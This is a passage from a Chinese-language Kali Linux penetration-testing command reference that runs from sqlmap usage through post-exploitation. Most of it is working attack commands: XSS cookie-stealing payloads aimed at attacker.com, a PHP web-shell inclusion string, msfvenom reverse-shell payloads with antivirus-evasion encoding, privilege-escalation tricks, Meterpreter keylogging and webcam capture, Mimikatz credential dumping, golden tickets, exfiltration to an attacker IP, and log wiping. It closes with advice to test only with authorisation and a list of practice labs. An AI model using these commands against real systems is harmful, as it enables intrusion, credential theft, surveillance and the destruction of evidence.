sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name -C column1,column2 --dump

# 导出所有
sqlmap -u "http://target.com/page?id=1" --dump-all

# 获取 Shell
sqlmap -u "http://target.com/page?id=1" --os-shell
sqlmap -u "http://target.com/page?id=1" --sql-shell

# 读取文件
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# 写入文件
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# 绕过 WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase
sqlmap -u "http://target.com/page?id=1" --random-agent

# 常用 tamper 脚本
# space2comment - 空格转注释
# between - 使用 BETWEEN 替换 >
# randomcase - 随机大小写
# charencode - URL 编码
# base64encode - Base64 编码

# 提高速度
sqlmap -u "http://target.com/page?id=1" --threads=10

# 风险和级别
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
# level: 1-5 (测试深度)
# risk: 1-3 (测试风险)

# 批量测试
sqlmap -m urls.txt --batch
```

### 7.2 XSS 攻击

```bash
# XSStrike - XSS 扫描器
xsstrike -u "http://target.com/page?search=test"
xsstrike -u "http://target.com/page" --data "search=test"
xsstrike -u "http://target.com/page?search=test" --crawl
xsstrike -u "http://target.com/page?search=test" --fuzzer

# Dalfox - 现代 XSS 扫描器
dalfox url "http://target.com/page?search=test"
dalfox file urls.txt
dalfox url "http://target.com/page?search=test" --blind your-server.com

# 手动测试 Payload
# 基本测试
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

# 绕过过滤
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="alert('XSS')">
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>

# 编码绕过
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;

# Cookie 窃取
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

### 7.3 Burp Suite

```bash
# 启动 Burp Suite
burpsuite

# 常用功能
# 1. Proxy - 拦截和修改请求
# 2. Repeater - 重放请求
# 3. Intruder - 自动化攻击
# 4. Scanner - 漏洞扫描（Pro 版）
# 5. Decoder - 编码/解码
# 6. Comparer - 比较响应

# 配置代理
# 浏览器设置代理: 127.0.0.1:8080
# 或使用 FoxyProxy 插件

# 导入 CA 证书（HTTPS）
# 访问 http://burp 下载证书
# 导入到浏览器信任的根证书

# Intruder 攻击类型
# Sniper - 单参数逐个测试
# Battering ram - 所有参数使用相同 payload
# Pitchfork - 多参数并行测试
# Cluster bomb - 多参数组合测试

# 常用扩展
# - Logger++
# - Autorize
# - JSON Web Tokens
# - Param Miner
# - Active Scan++
```

### 7.4 OWASP ZAP

```bash
# 启动 ZAP
zaproxy

# 命令行扫描
zap-cli quick-scan http://target.com
zap-cli active-scan http://target.com
zap-cli spider http://target.com

# API 扫描
zap-api-scan.py -t http://target.com/api/openapi.json -f openapi

# Docker 运行
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://target.com
docker run -t owasp/zap2docker-stable zap-full-scan.py -t http://target.com
```

### 7.5 文件包含与上传

```bash
# 本地文件包含 (LFI) 测试
# 基本测试
http://target.com/page?file=../../../etc/passwd
http://target.com/page?file=....//....//....//etc/passwd
http://target.com/page?file=/etc/passwd%00

# PHP 包装器
http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php
http://target.com/page?file=php://input
http://target.com/page?file=data://text/plain,<?php system($_GET['cmd']); ?>
http://target.com/page?file=expect://id

# 日志文件包含
http://target.com/page?file=/var/log/apache2/access.log
http://target.com/page?file=/var/log/apache2/error.log

# 远程文件包含 (RFI)
http://target.com/page?file=http://attacker.com/shell.txt

# 文件上传绕过
# 修改 Content-Type
Content-Type: image/jpeg

# 双扩展名
shell.php.jpg
shell.jpg.php

# 空字节
shell.php%00.jpg

# 大小写
shell.pHp

# 特殊扩展名
shell.php5
shell.phtml
shell.phar

# .htaccess 上传
AddType application/x-httpd-php .jpg
```


---

## 8. 无线攻击

### 8.1 无线网卡配置

```bash
# 查看无线网卡
iwconfig
iw dev

# 查看网卡信息
iw phy phy0 info

# 启用监听模式
# 方法 1：使用 airmon-ng
sudo airmon-ng start wlan0

# 方法 2：手动设置
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 检查监听模式
iwconfig wlan0mon

# 停止监听模式
sudo airmon-ng stop wlan0mon

# 杀死干扰进程
sudo airmon-ng check kill

# 更改信道
sudo iw dev wlan0mon set channel 6

# 更改 MAC 地址
sudo ip link set wlan0 down
sudo macchanger -r wlan0          # 随机 MAC
sudo macchanger -m 00:11:22:33:44:55 wlan0  # 指定 MAC
sudo ip link set wlan0 up
```

### 8.2 Aircrack-ng 套件

```bash
# 扫描无线网络
sudo airodump-ng wlan0mon

# 针对特定网络扫描
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c 信道
# --bssid 目标 AP 的 MAC
# -w 输出文件前缀

# 解除认证攻击（获取握手包）
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -0 解除认证攻击
# 10 发送 10 个数据包
# -a AP 的 MAC
# -c 客户端的 MAC

# 破解 WPA/WPA2 密码
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# 使用 hashcat 破解（更快）
# 首先转换格式
sudo aircrack-ng -J hash capture-01.cap
# 或使用 hcxpcapngtool
hcxpcapngtool -o hash.hc22000 capture-01.cap

# 然后用 hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# WEP 破解（已过时但仍存在）
# 收集 IV
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# ARP 重放攻击
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# 破解
sudo aircrack-ng wep_capture-01.cap

# 伪造 AP
sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon
```

### 8.3 Wifite（自动化工具）

```bash
# 基本使用
sudo wifite

# 指定接口
sudo wifite -i wlan0

# 只攻击 WPA
sudo wifite --wpa

# 只攻击特定 BSSID
sudo wifite --bssid AA:BB:CC:DD:EE:FF

# 指定字典
sudo wifite --dict /usr/share/wordlists/rockyou.txt

# 静默模式
sudo wifite --kill

# 显示所有选项
sudo wifite --help
```

### 8.4 其他无线工具

```bash
# Kismet - 无线网络探测器
sudo kismet

# Fern WiFi Cracker（GUI）
sudo fern-wifi-cracker

# Reaver - WPS 攻击
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1  # Pixie Dust 攻击

# Bully - 另一个 WPS 攻击工具
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# Fluxion - 钓鱼攻击
sudo fluxion

# WiFi Pumpkin（需要单独安装）
# 用于创建恶意热点
```

---

## 9. 权限提升

### 9.1 Linux 提权

```bash
# 基本信息收集
whoami
id
uname -a
cat /etc/os-release
cat /etc/issue

# 查找 SUID 文件
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 查找 SGID 文件
find / -perm -2000 -type f 2>/dev/null

# 查找可写文件
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null

# 查找配置文件
find / -name "*.conf" 2>/dev/null
find / -name "*.config" 2>/dev/null

# 查找密码文件
find / -name "*password*" 2>/dev/null
grep -r "password" /etc/ 2>/dev/null

# 检查 sudo 权限
sudo -l

# 检查 cron 任务
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# 检查运行的服务
ps aux
systemctl list-units --type=service

# 检查网络连接
netstat -tlnp
ss -tlnp

# 检查已安装的软件
dpkg -l
rpm -qa

# 检查内核漏洞
uname -r
# 然后搜索对应版本的漏洞

# 检查环境变量
env
echo $PATH

# 检查历史命令
cat ~/.bash_history
cat ~/.zsh_history
```

```bash
# 自动化提权脚本
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# 或下载后执行
./linpeas.sh

# LinEnum
./LinEnum.sh

# linux-exploit-suggester
./linux-exploit-suggester.sh

# linux-smart-enumeration
./lse.sh

# pspy - 监控进程
./pspy64
```

```bash
# 常见提权方法

# 1. SUID 提权
# 如果 find 有 SUID
find . -exec /bin/sh -p \; -quit

# 如果 vim 有 SUID
vim -c ':!/bin/sh'

# 如果 python 有 SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# 2. Sudo 提权
# 如果可以 sudo 运行某些命令
sudo vim -c ':!/bin/sh'
sudo find /etc -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/passwd  # 然后输入 !/bin/sh

# 3. Cron 提权
# 如果 cron 任务执行的脚本可写
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh
# 等待 cron 执行后
/tmp/bash -p

# 4. 内核漏洞
# Dirty COW (CVE-2016-5195)
# 适用于 Linux 内核 2.6.22 < 3.9

# 5. 环境变量劫持
# 如果 SUID 程序调用其他程序时没有使用绝对路径
echo '/bin/bash' > /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH
./vulnerable_suid_program

# GTFOBins - 查找可利用的二进制文件
# https://gtfobins.github.io/
```

### 9.2 Windows 提权

```bash
# 基本信息收集
whoami
whoami /priv
whoami /groups
systeminfo
hostname
net user
net localgroup administrators

# 查找敏感文件
dir /s *password* 
dir /s *cred*
findstr /si password *.txt *.ini *.config

# 检查服务
sc query
wmic service get name,displayname,pathname,startmode

# 检查计划任务
schtasks /query /fo LIST /v

# 检查已安装软件
wmic product get name,version

# 检查网络
ipconfig /all
netstat -ano
route print

# 检查防火墙
netsh firewall show state
netsh advfirewall show allprofiles

# 检查补丁
wmic qfe get Caption,Description,HotFixID,InstalledOn

# PowerShell 信息收集
Get-Process
Get-Service
Get-ScheduledTask
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
```

```powershell
# 自动化提权脚本
# WinPEAS
.\winPEASany.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Sherlock（检测缺失补丁）
Import-Module .\Sherlock.ps1
Find-AllVulns

# Watson
.\Watson.exe

# Seatbelt
.\Seatbelt.exe -group=all
```

```bash
# 常见 Windows 提权方法

# 1. 服务路径未加引号
# 如果服务路径包含空格且未加引号
# C:\Program Files\Some Service\service.exe
# 可以在 C:\Program.exe 放置恶意程序

# 2. 服务权限配置错误
# 使用 accesschk 检查
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
# 如果可以修改服务配置
sc config vulnerable_service binpath= "C:\path\to\malicious.exe"
sc stop vulnerable_service
sc start vulnerable_service

# 3. AlwaysInstallElevated
# 检查注册表
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 如果都为 1，可以用 msi 提权
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi
msiexec /quiet /qn /i shell.msi

# 4. 令牌模拟
# 如果有 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege
# 使用 Potato 系列工具
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\path\to\shell.exe" -t *
.\PrintSpoofer.exe -i -c cmd
.\GodPotato.exe -cmd "cmd /c whoami"

# 5. 内核漏洞
# 使用 Windows-Exploit-Suggester
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt
```


---

## 10. 后渗透

### 10.1 Metasploit Framework

```bash
# 启动 Metasploit
msfconsole

# 数据库初始化
sudo msfdb init
sudo msfdb start

# 基本命令
help                              # 帮助
search exploit_name               # 搜索模块
use exploit/path/to/module        # 使用模块
info                              # 模块信息
show options                      # 显示选项
set OPTION value                  # 设置选项
setg OPTION value                 # 全局设置
run / exploit                     # 执行
back                              # 返回
exit                              # 退出

# 搜索模块
search type:exploit platform:windows
search cve:2021
search name:smb
search ms17-010

# 常用漏洞利用
# MS17-010 (永恒之蓝)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 4444
exploit

# MS08-067
use exploit/windows/smb/ms08_067_netapi
set RHOSTS target_ip
exploit

# 生成 Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell64.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh

# 编码绕过
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe

# 监听器
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 4444
exploit -j                        # 后台运行

# 会话管理
sessions                          # 列出会话
sessions -i 1                     # 进入会话 1
sessions -k 1                     # 杀死会话 1
background                        # 后台当前会话
```

### 10.2 Meterpreter 命令

```bash
# 系统信息
sysinfo
getuid
getpid
ps

# 文件操作
pwd
cd /path
ls
cat file
download file
upload file
edit file
rm file
mkdir dir
rmdir dir

# 网络
ipconfig
netstat
route
portfwd add -l 8080 -p 80 -r target_ip  # 端口转发

# 进程
ps
migrate PID                       # 迁移到其他进程
kill PID

# 权限
getsystem                         # 尝试提权
getprivs                          # 获取权限

# 密码
hashdump                          # 导出哈希
load kiwi                         # 加载 Mimikatz
creds_all                         # 获取所有凭证
kiwi_cmd sekurlsa::logonpasswords

# 键盘记录
keyscan_start
keyscan_dump
keyscan_stop

# 截图
screenshot

# 摄像头
webcam_list
webcam_snap
webcam_stream

# Shell
shell                             # 获取系统 shell
execute -f cmd.exe -i -H          # 执行命令

# 持久化
run persistence -h
run persistence -U -i 5 -p 4444 -r your_ip

# 清理痕迹
clearev                           # 清除事件日志

# 后渗透模块
run post/windows/gather/checkvm
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
run post/multi/recon/local_exploit_suggester
```

### 10.3 横向移动

```bash
# CrackMapExec
# SMB
crackmapexec smb target -u user -p password
crackmapexec smb target -u user -p password --shares
crackmapexec smb target -u user -p password -x "whoami"
crackmapexec smb target -u user -p password -X "Get-Process"  # PowerShell

# Pass the Hash
crackmapexec smb target -u user -H NTLM_HASH
crackmapexec smb target -u user -H LM:NTLM

# WinRM
crackmapexec winrm target -u user -p password
crackmapexec winrm target -u user -p password -x "whoami"

# SSH
crackmapexec ssh target -u user -p password

# Impacket 工具集
# PsExec
impacket-psexec domain/user:password@target
impacket-psexec -hashes LM:NTLM domain/user@target

# WMIExec
impacket-wmiexec domain/user:password@target
impacket-wmiexec -hashes LM:NTLM domain/user@target

# SMBExec
impacket-smbexec domain/user:password@target

# ATExec
impacket-atexec domain/user:password@target "command"

# DCSync
impacket-secretsdump domain/user:password@dc_ip
impacket-secretsdump -hashes LM:NTLM domain/user@dc_ip

# Evil-WinRM
evil-winrm -i target -u user -p password
evil-winrm -i target -u user -H NTLM_HASH

# Mimikatz
# 导出凭证
sekurlsa::logonpasswords
sekurlsa::wdigest

# Pass the Hash
sekurlsa::pth /user:Administrator /domain:target /ntlm:HASH /run:cmd

# Pass the Ticket
kerberos::ptt ticket.kirbi

# Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# DCSync
lsadump::dcsync /domain:domain.local /user:Administrator
```

### 10.4 数据外泄

```bash
# 压缩数据
tar -czvf data.tar.gz /path/to/data
zip -r data.zip /path/to/data

# 编码传输
base64 data.tar.gz > data.b64
cat data.b64 | base64 -d > data.tar.gz

# HTTP 传输
# 攻击机启动服务器
python3 -m http.server 8080

# 目标机下载
curl http://attacker_ip:8080/file -o file
wget http://attacker_ip:8080/file

# 目标机上传
curl -X POST -F "file=@data.tar.gz" http://attacker_ip:8080/upload

# Netcat 传输
# 攻击机监听
nc -lvnp 4444 > received_file

# 目标机发送
nc attacker_ip 4444 < file_to_send

# SCP
scp file user@attacker_ip:/path/

# DNS 隧道
# 使用 dnscat2 或 iodine

# ICMP 隧道
# 使用 icmpsh 或 ptunnel
```

### 10.5 清理痕迹

```bash
# Linux 清理
# 清除历史
history -c
echo "" > ~/.bash_history
unset HISTFILE

# 清除日志
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/messages

# 清除登录记录
echo "" > /var/log/wtmp
echo "" > /var/log/btmp
echo "" > /var/log/lastlog

# 修改文件时间戳
touch -r reference_file target_file
touch -t 202401011200 file

# Windows 清理
# 清除事件日志
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# PowerShell
Clear-EventLog -LogName System
Clear-EventLog -LogName Security
Clear-EventLog -LogName Application

# 清除 PowerShell 历史
Remove-Item (Get-PSReadlineOption).HistorySavePath

# 清除 RDP 历史
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f

# Meterpreter
clearev
timestomp file -m "01/01/2024 12:00:00"
```

---

## 11. 常见错误与解决

### 11.1 网络相关错误

```
┌─────────────────────────────────────────────────────────────────────┐
│ 错误：Network is unreachable                                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 原因：                                                               │
│ 1. 网络接口未启动                                                    │
│ 2. 没有配置 IP 地址                                                  │
│ 3. 路由配置错误                                                      │
│                                                                      │
│ 解决方案：                                                            │
│ # 检查接口状态                                                       │
│ ip link show                                                         │
│                                                                      │
│ # 启动接口                                                           │
│ sudo ip link set eth0 up                                             │
│                                                                      │
│ # 获取 DHCP 地址                                                     │
│ sudo dhclient eth0                                                   │
│                                                                      │
│ # 或手动配置                                                         │
│ sudo ip addr add 192.168.1.100/24 dev eth0                          │
│ sudo ip route add default via 192.168.1.1                           │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

```
┌─────────────────────────────────────────────────────────────────────┐
│ 错误：No route to host                                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 原因：                                                               │
│ 1. 目标主机防火墙阻止                                                │
│ 2. 路由问题                                                          │
│ 3. 目标主机不在线                                                    │
│                                                                      │
│ 解决方案：                                                            │
│ # 检查路由                                                           │
│ ip route get target_ip                                               │
│                                                                      │
│ # 检查连通性                                                         │
│ ping target_ip                                                       │
│ traceroute target_ip                                                 │
│                                                                      │
│ # 检查 ARP                                                           │
│ arp -a                                                               │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 11.2 权限相关错误

```
┌─────────────────────────────────────────────────────────────────────┐
│ 错误：Permission denied                                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 原因：                                                               │
│ 1. 没有足够的权限                                                    │
│ 2. 文件权限限制                                                      │
│ 3. SELinux/AppArmor 限制                                            │
│                                                                      │
│ 解决方案：                                                            │
│ # 使用 sudo                                                          │
│ sudo command                                                         │
│                                                                      │
│ # 检查文件权限                                                       │
│ ls -la file                                                          │
│                                                                      │
│ # 修改权限                                                           │
│ chmod +x script.sh                                                   │
│ chmod 755 file                                                       │
│                                                                      │
│ # 检查 SELinux                                                       │
│ getenforce                                                           │
│ sudo setenforce 0  # 临时禁用                                        │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

```
┌─────────────────────────────────────────────────────────────────────┐
│ 错误：Operation not permitted (即使是 root)                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 原因：                                                               │
│ 1. 文件有不可变属性                                                  │
│ 2. 文件系统只读                                                      │
│ 3. 安全模块限制                                                      │
│                                                                      │
│ 解决方案：                                                            │
│ # 检查文件属性                                                       │
│ lsattr file                                                          │
│                                                                      │
│ # 移除不可变属性                                                     │
│ sudo chattr -i file                                                  │
│                                                                      │
│ # 检查文件系统                                                       │
│ mount | grep "ro,"                                                   │
│                                                                      │
│ # 重新挂载为读写                                                     │
│ sudo mount -o remount,rw /                                           │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 11.3 工具相关错误

```
┌─────────────────────────────────────────────────────────────────────┐
│ 错误：Nmap - Host seems down                                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 原因：                                                               │
│ 1. 目标阻止 ICMP                                                     │
│ 2. 防火墙过滤                                                        │
│ 3. 目标确实离线                                                      │
│                                                                      │
│ 解决方案：                                                            │
│ # 跳过主机发现                                                       │
│ nmap -Pn target                                                      │
│                                                                      │
│ # 使用不同的发现方法                                                 │
│ nmap -PS22,80,443 target                                             │
│ nmap -PA80,443 target                                                │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

```
┌─────────────────────────────────────────────────────────────────────┐
│ 错误：Aircrack-ng - No networks found                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 原因：                                                               │
│ 1. 网卡不在监听模式                                                  │
│ 2. 驱动不支持                                                        │
│ 3. 干扰进程运行                                                      │
│                                                                      │
│ 解决方案：                                                            │
│ # 杀死干扰进程                                                       │
│ sudo airmon-ng check kill                                            │
│                                                                      │
│ # 重新启动监听模式                                                   │
│ sudo airmon-ng start wlan0                                           │
│                                                                      │
│ # 检查网卡状态                                                       │
│ iwconfig                                                             │
│                                                                      │
│ # 尝试不同信道                                                       │
│ sudo airodump-ng wlan0mon --channel 1-14                             │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

```
┌─────────────────────────────────────────────────────────────────────┐
│ 错误：Metasploit - Exploit failed / No session created               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 原因：                                                               │
│ 1. 目标不存在该漏洞                                                  │
│ 2. 防火墙/杀软阻止                                                   │
│ 3. Payload 配置错误                                                  │
│ 4. 网络连接问题                                                      │
│                                                                      │
│ 解决方案：                                                            │
│ # 确认漏洞存在                                                       │
│ nmap --script=vuln target                                            │
│                                                                      │
│ # 检查 Payload 配置                                                  │
│ show options                                                         │
│ # 确保 LHOST 是攻击机可达的 IP                                       │
│                                                                      │
│ # 尝试不同的 Payload                                                 │
│ show payloads                                                        │
│ set PAYLOAD windows/meterpreter/reverse_http                         │
│                                                                      │
│ # 使用编码器                                                         │
│ set EnableStageEncoding true                                         │
│ set StageEncoder x86/shikata_ga_nai                                  │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 11.4 常见错误速查表

| 错误 | 可能原因 | 解决方案 |
|------|---------|---------|
| Command not found | 工具未安装/PATH 问题 | apt install tool / 检查 PATH |
| Connection refused | 服务未运行/端口错误 | 检查服务状态和端口 |
| Connection timed out | 防火墙/网络问题 | 检查防火墙规则 |
| Permission denied | 权限不足 | 使用 sudo / 检查权限 |
| No space left on device | 磁盘满 | df -h / 清理空间 |
| Too many open files | 文件描述符限制 | ulimit -n 65535 |
| Segmentation fault | 程序错误/内存问题 | 更新工具/检查参数 |
| SSL certificate problem | 证书验证失败 | 使用 -k 或 --insecure |
| Database not connected | MSF 数据库问题 | msfdb reinit |
| Module not found | Python 模块缺失 | pip install module |

---

## 总结

Kali Linux 是渗透测试的强大平台，掌握这些命令需要大量实践。

**学习路径建议**：

1. **基础阶段**：熟悉 Linux 基本命令、网络配置
2. **信息收集**：掌握 Nmap、子域名枚举、Web 指纹识别
3. **漏洞利用**：学习 Metasploit、SQLMap、常见漏洞
4. **后渗透**：权限提升、横向移动、持久化
5. **高级技术**：免杀、流量隐藏、红队技术

**练习平台推荐**：
- HackTheBox (https://www.hackthebox.com/)
- TryHackMe (https://tryhackme.com/)
- VulnHub (https://www.vulnhub.com/)
- PortSwigger Web Security Academy
- DVWA、bWAPP、WebGoat

**重要提醒**：
- 始终在授权范围内进行测试
- 保持工具和系统更新
- 记录所有操作用于报告
- 遵守法律法规和道德准则

---

> 📚 参考资料
> - [Kali Linux 官方文档](https://www.kali.org/docs/)
> - [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
> - [HackTricks](https://book.hacktricks.xyz/)
> - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
> - [GTFOBins](https://gtfobins.github.io/)
> - [LOLBAS](https://lolbas-project.github.io/)
